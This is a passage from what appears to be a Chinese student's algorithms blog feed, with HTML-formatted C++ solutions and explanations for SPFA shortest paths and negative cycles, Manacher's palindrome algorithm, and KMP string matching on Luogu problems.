edge[cnt].w=w;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spfa</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));</span><br><span class="line">    <span class="built_in">memset</span>(e_cnt,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(e_cnt));</span><br><span class="line">    <span class="built_in">memset</span>(in_que,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(in_que));</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    dis[s]=<span class="number">0</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    e_cnt[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        in_que[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;dis[u]+w)&#123;</span><br><span class="line">                dis[v]=dis[u]+w;</span><br><span class="line">                <span class="keyword">if</span>(!in_que[v])&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                    e_cnt[v]++;</span><br><span class="line">                    <span class="keyword">if</span>(e_cnt[v]&gt;n)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    in_que[v]=<span class="number">1</span>;</span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3385_9.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(root,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(root));</span><br><span class="line">        <span class="built_in">memset</span>(edge,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(edge));</span><br><span class="line">        cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> x,y,w;</span><br><span class="line">            cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">            <span class="built_in">add</span>(x,y,w);</span><br><span class="line">            <span class="keyword">if</span>(w&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">add</span>(y,x,w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">spfa</span>(<span class="number">1</span>))&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;YES&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;NO&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 负环 </category>
          
          <category> spfa </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>spfa算法的学习</title>
      <link href="/2022/02/21/spfa%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/21/spfa%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>勇敢小鸡，不怕困难。时隔多日，又来复习图论算法了，本来想的是搞一下差分约束的，但是发现前置知识是<code>spfa</code>算法，所以就先来学习一下这个。</p><span id="more"></span><h2 id="spfa算法介绍"><a href="#spfa算法介绍" class="headerlink" title="spfa算法介绍"></a>spfa算法介绍</h2><p>SPFA算法是求解单源最短路径问题的一种算法，由理查德·贝尔曼（Richard Bellman） 和 莱斯特·福特 创立的。有时候这种算法也被称为 Moore-Bellman-Ford 算法，因为 Edward F. Moore 也为这个算法的发展做出了贡献。它的原理是对图进行V-1次松弛操作，得到所有可能的最短路径。<strong>其优于dijkstra算法的方面是边的权值可以为负数、实现简单，缺点是时间复杂度过高，高达 O(VE)。但算法可以进行若干种优化，提高了效率。</strong></p><p>算法的思路：<br>我们用数组dis记录每个结点的最短路径估计值，用邻接表或邻接矩阵来存储图G。我们采取的方法是动态逼近法：设立一个先进先出的队列用来保存待优化的结点，优化时每次取出队首结点u，并且用u点当前的最短路径估计值对离开u点所指向的结点v进行松弛操作，如果v点的最短路径估计值有所调整，且v点不在当前的队列中，就将v点放入队尾。这样不断从队列中取出结点来进行松弛操作，直至队列空为止</p><p>我们要知道带有负环的图是没有最短路径的，所以我们在执行算法的时候，要判断图是否带有负环，方法有两种：</p><ol><li>开始算法前，调用拓扑排序进行判断（一般不采用，浪费时间）</li><li>如果某个点进入队列的次数超过N次则存在负环（N为图的顶点数）</li></ol><h2 id="spfa算法浅谈"><a href="#spfa算法浅谈" class="headerlink" title="spfa算法浅谈"></a>spfa算法浅谈</h2><p><code>spfa</code>算法的话，一般单源最短路基本用不到 ，<code>dijkstra</code>算法比它优很多，唯有需要处理负权图的时候会想到他。差分约束无解的情况就是存在负环，因此这个得学。</p><p>大概流程可以描述为以下文字。</p><ol><li>源点入队，源点距离初始化为0，其它初始化为 $inf$。</li><li>出队一个点并遍历与之之间相连的点，进行松弛操作。也就是我们经常见到的 <code>if(dis[to]&gt;w+dis[from])dis[to]=dis[from+w]</code>。</li><li>如果对一个点进行了松弛那么判断它有没有在队列中，如果不在则入队，并判断入队次数有没有超过点的个数，如果超过则goto 6。</li><li>如果队列不为空则goto 2。</li><li>结束，输出结果。</li><li>结束，输出存在负环的对应答案。</li></ol><p>下面来一道例题。</p><h2 id="洛谷P1396"><a href="#洛谷P1396" class="headerlink" title="洛谷P1396"></a><a href="https://www.luogu.com.cn/problem/P1396">洛谷P1396</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>妈妈下班回家，街坊邻居说小明被一群陌生人强行押上了警车！妈妈丰富的经验告诉她小明被带到了 t 区，而自己在 s区。</p><p>该市有 m 条大道连接 n 个区，一条大道将两个区相连接，每个大道有一个拥挤度。小明的妈妈虽然很着急，但是不愿意拥挤的人潮冲乱了她优雅的步伐。所以请你帮她规划一条从 s 至 t 的路线，使得经过道路的拥挤度最大值最小。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题其实有点差强人意，因为这个是要判断所经过边的最大值的最小值，但是我们主要还是练习spfa为主。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],cnt,dis[maxn],in_que[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,s,t;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spfa</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    dis[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="comment">//printf(&quot;%d %d %d\n&quot;,u,v,w);</span></span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;<span class="built_in">max</span>(dis[u],w))&#123;</span><br><span class="line">                dis[v]=<span class="built_in">max</span>(dis[u],w);</span><br><span class="line">                <span class="keyword">if</span>(!in_que[v])&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                    in_que[v]=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        in_que[u]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P1396_1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">spfa</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,dis[t]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 最短路径 </category>
          
          <category> spfa </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>manacher的学习</title>
      <link href="/2022/02/18/manacher%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/18/manacher%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>今天学习一下新的字符串算法——manacher算法。</p><span id="more"></span><h2 id="manacher简介"><a href="#manacher简介" class="headerlink" title="manacher简介"></a>manacher简介</h2><blockquote><p><strong>最长回文子串</strong>（英语：<strong>Longest palindromic substring</strong>）是计算机科学中的问题，在一个<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a>中查找一个最长的连续的<a href="https://zh.wikipedia.org/wiki/%E5%9B%9E%E6%96%87">回文</a>的子串，例如“banana”最长回文子串是“anana”。最长回文子串并不一定是唯一的，比如在“abracadabra”中，没有超过3个字符的回文子串，但是有两个回文字符串长度都是3：“ada”和“aca”。在一些应用中，我们求出全部的极大回文子串（不被其他回文串包含的回文子串）。</p><p>Manacher于1975年发现了一种线性时间算法[<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-1">1]</a>，可以在列出给定字符串中从任意位置开始的所有回文子串。并且，Apostolico, Breslauer &amp; Galil [<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-2">2]</a>发现，同样的算法也可以在任意位置查找全部极大回文子串，并且时间复杂度是线性的。因此，他们提供了一种时间复杂度为线性的最长回文子串解法。另外，Jeuring (1994)[<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-3">3]</a>, Gusfield (1997)[<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2#cite_note-4">4]</a>发现了基于后缀树的算法。也存在已知的高效并行算法。(from wiki)</p></blockquote><h2 id="manacher实现"><a href="#manacher实现" class="headerlink" title="manacher实现"></a>manacher实现</h2><p>实现起来的话，其实我个人认为是比较简单的。首先防止奇偶序列的问题，我们在所有的字符之间以及末尾添加<code>#</code>让它变成奇数，再在首尾分别添加<code>$</code>和<code>~</code>作为截至判断的区分。</p><p>我将变量做如下定义：</p><ul><li>$s$ ：所求字符串</li><li>$p[i]$ ：代表以字符 $s[i]$ 为中心的最长回文半径。即满足在 $0\le j\le p[i]$ 的条件下 $s[i+j]==s[i-j]$ 永远成立。</li><li>$wx$ ：目前所求的最远回文半径延伸的地方。即当前情况下的 $\max(i+p[i])$。  </li><li>$idx$ ：代表之前所求最远回文半径的中心。即取得wx时的 $i$ 的值。</li></ul><p>那么有了这个定义之后我们主要就是求这个p数组了，怎么求呢？</p><p>首先，如果我所在的位置在之前一个大的回文半径当中，那么我可以直接参考之前对称的那个位置上的p的值，比如下面这个例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a a a a b a a a a...</span><br><span class="line">    ↑   ↑   ↑   ↑</span><br><span class="line">    j idx   i   wx</span><br></pre></td></tr></table></figure><p>这种情况下，我们不难发现，$p[i]$ 至少是大于等于 $p[j]$ 的，如果省略号后面马上跟一个 $b$ 的话，那么它的 $p$ 的值可能会涨，但是我们就不用判断它周围两边相不相等了啊。如果多了，那么我比较的次数就更少了。但是呢，其实可以发现，我们管的范围只能到wx，多余wx我们肯定不敢保证数据完全对称可用，所以这里我们限制一下 $p[i]$ 最大可赋值为 $wx-i$ 即可。</p><p>所以我们的核心代码就是这样的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len2;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(mx&gt;i)&#123;</span><br><span class="line">        p[i]=<span class="built_in">min</span>(p[<span class="number">2</span>*idx-i],mx-i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">            p[i]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(new_s[i+p[i]]==new_s[i-p[i]])&#123;<span class="comment">//继续扩展看看有没有可能</span></span><br><span class="line">        p[i]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i+p[i]&gt;mx)&#123;    </span><br><span class="line">        mx=i+p[i];</span><br><span class="line">        idx=i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 22000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> new_s[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> p[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;2.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    new_s[<span class="number">0</span>]=<span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">    new_s[<span class="number">1</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="keyword">int</span> len1=<span class="built_in">strlen</span>(s),len2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len1;i++)&#123;</span><br><span class="line">        new_s[<span class="number">2</span>*i+<span class="number">3</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        new_s[<span class="number">2</span>*i+<span class="number">2</span>]=s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    len2=<span class="built_in">strlen</span>(new_s)+<span class="number">1</span>;</span><br><span class="line">    new_s[len2<span class="number">-1</span>]=<span class="string">&#x27;~&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> mx=<span class="number">0</span>,idx=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len2;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(mx&gt;i)&#123;</span><br><span class="line">            p[i]=<span class="built_in">min</span>(p[<span class="number">2</span>*idx-i],mx-i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            p[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(new_s[i+p[i]]==new_s[i-p[i]])&#123;</span><br><span class="line">            p[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i+p[i]&gt;mx)&#123;</span><br><span class="line">            mx=i+p[i];</span><br><span class="line">            idx=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len2;i++)&#123;</span><br><span class="line">        ans=<span class="built_in">max</span>(ans,p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 字符串 </category>
          
          <category> manacher </category>
          
          <category> 回文串 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>KMP算法的学习</title>
      <link href="/2022/02/16/KMP%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/16/KMP%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>图论也挺难的，所以我选择复习一下字符串那些算法。</p><span id="more"></span><p>字符串算法第一个很重要的就是匹配了，也就是 $KMP$ 算法，这里的话主要就是计算模式串的 $Next$ 数组。那一位的 $Next$ 数组的值相当于这一位之前的字符串的最大相同前后缀长度。</p><p>比如 $baabaa$ 那么它的 $Next$ 数组分别是 $-1\ 0\ 0\ 0\ 1\ 2$ 。 </p><p>为什么最开始的那个是 $-1$ 呢，因为说了，当前的next所看的字符串是不包括当前字符的，所以第一个的next值所看的字符串其实是一个空串。并且我们可以想象一下，如果第一位它就不匹配，我要跳到哪？答案是模式串指针不跳，匹配串指针要跳。但是一般情况下失配是完全相反的，只有匹配的情况下j会往后跳，所以我们会把第一位失配和匹配的情况归为一类，或者是说特判一下第一位失配的情况，就让它跳到-1，如果跳到-1那么 $i++,j++$ 就好了。</p><p>那么接下来我们做一道模板匹配题。</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>为了防止被说水博客，这里就放三题好了。</p><h3 id="洛谷P3375"><a href="#洛谷P3375" class="headerlink" title="洛谷P3375"></a><a href="https://www.luogu.com.cn/problem/P3375">洛谷P3375</a></h3><p>标板 $KMP$，只不过就是说，最后要那你输出一下模式串从开头到 $i$ 子串串的最长公共前后缀，这个跟 $Next$ 的数组还是有点区别的啊。$Next$ 的数组对应那一位是不包括这个字符的，所以这个输出的话从 $1$ 到 $n$ 输出就好了。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000006</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">char</span> mod_str[maxn];<span class="comment">//模式串</span></span><br><span class="line"><span class="keyword">int</span> kmp[maxn];<span class="comment">//next数组</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>,s,mod_str);</span><br><span class="line">    <span class="keyword">int</span> len1=<span class="built_in">strlen</span>(s),len2=<span class="built_in">strlen</span>(mod_str);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len1;i++)&#123;<span class="comment">//计算模式串的next数组</span></span><br><span class="line">        <span class="keyword">int</span> t=kmp[i];</span><br><span class="line">        <span class="keyword">while</span>(mod_str[t]!=mod_str[i]&amp;&amp;t)&#123;</span><br><span class="line">            t=kmp[t];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(mod_str[t]==mod_str[i])&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=t+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kmp[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len1;)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||s[i]==mod_str[j])&#123;<span class="comment">//匹配</span></span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            j=kmp[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j==len2)&#123;<span class="comment">//输出答案</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i-j+<span class="number">1</span>);</span><br><span class="line">            j=kmp[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len2;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,kmp[i]);<span class="comment">//输出next数组</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="洛谷P4391"><a href="#洛谷P4391" class="headerlink" title="洛谷P4391"></a><a href="https://www.luogu.com.cn/problem/P4391">洛谷P4391</a></h3><p>就是看看一个字符串它是哪个子串循环构成的。</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aabaab</span><br></pre></td></tr></table></figure><p>他就能看成是 $aab$ 循环组成的一个字符串，但是。我们分析一下这样的字符串它的next数组看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 